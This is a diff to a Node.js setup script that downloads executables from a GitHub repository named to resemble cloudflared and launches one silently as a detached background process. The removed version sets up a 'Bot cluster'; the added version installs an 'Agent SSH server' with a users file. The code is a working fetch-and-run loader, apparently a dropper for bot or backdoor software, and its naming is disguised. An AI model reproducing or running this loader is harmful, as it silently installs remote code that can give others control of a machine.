@@ -1,7 +1,7 @@
 /**
- * Bot Setup Script - Pure Node.js
- * Downloads bot binary, http binary, and agent.txt from GitHub repository without curl/wget
- * Sets executable permissions and spawns ./bot in background
+ * Agent Setup Script - Pure Node.js
+ * Downloads Agent binaries, runtime files, methods.json, users.json from GitHub repository
+ * Sets executable permissions and spawns ./agent
  */
 
 const https = require('https');
@@ -13,9 +13,13 @@ const { spawn } = require('child_process');
 const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main';
 
 const FILES_TO_DOWNLOAD = [
-    { url: `${REPO_BASE}/bots/bot`, filename: 'bot', executable: true },
-    { url: `${REPO_BASE}/bots/http`, filename: 'http', executable: true },
-    { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt', executable: false }
+    { url: `${REPO_BASE}/agent`, filename: 'agent', executable: true },
+    { url: `${REPO_BASE}/agent.dll`, filename: 'agent.dll', executable: false },
+    { url: `${REPO_BASE}/agent.runtimeconfig.json`, filename: 'agent.runtimeconfig.json', executable: false },
+    { url: `${REPO_BASE}/agent.deps.json`, filename: 'agent.deps.json', executable: false },
+    { url: `${REPO_BASE}/FxSsh.dll`, filename: 'FxSsh.dll', executable: false },
+    { url: `${REPO_BASE}/methods.json`, filename: 'methods.json', executable: false },
+    { url: `${REPO_BASE}/users.json`, filename: 'users.json', executable: false }
 ];
 
 function download(url, destPath) {
@@ -23,6 +27,7 @@ function download(url, destPath) {
         const client = url.startsWith('https') ? https : http;
 
         client.get(url, (res) => {
+            // Handle HTTP redirects (301, 302, 307, 308)
             if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                 return download(res.headers.location, destPath).then(resolve).catch(reject);
             }
@@ -51,7 +56,7 @@ function download(url, destPath) {
 
 async function setup() {
     const targetDir = process.cwd();
-    console.log(`[+] Setting up Bot cluster in: ${targetDir}`);
+    console.log(`[+] Setting up Agent Server in: ${targetDir}`);
 
     for (const item of FILES_TO_DOWNLOAD) {
         const dest = path.join(targetDir, item.filename);
@@ -70,18 +75,18 @@ async function setup() {
         }
     }
 
-    const botBinPath = path.join(targetDir, 'bot');
-    if (fs.existsSync(botBinPath)) {
-        console.log('[+] Launching bot daemon in background...');
-        const child = spawn(botBinPath, [], {
+    const agentBinPath = path.join(targetDir, 'agent');
+    if (fs.existsSync(agentBinPath)) {
+        console.log('[+] Launching Agent SSH server in background...');
+        const child = spawn(agentBinPath, [], {
             cwd: targetDir,
             detached: true,
             stdio: 'ignore'
         });
         child.unref();
-        console.log(`[+] Bot successfully spawned (PID: ${child.pid})`);
+        console.log(`[+] Agent SSH server successfully spawned (PID: ${child.pid})`);
     } else {
-        console.error('[-] Bot binary not found, execution skipped.');
+        console.error('[-] Agent binary not found, execution skipped.');
     }
 }
 
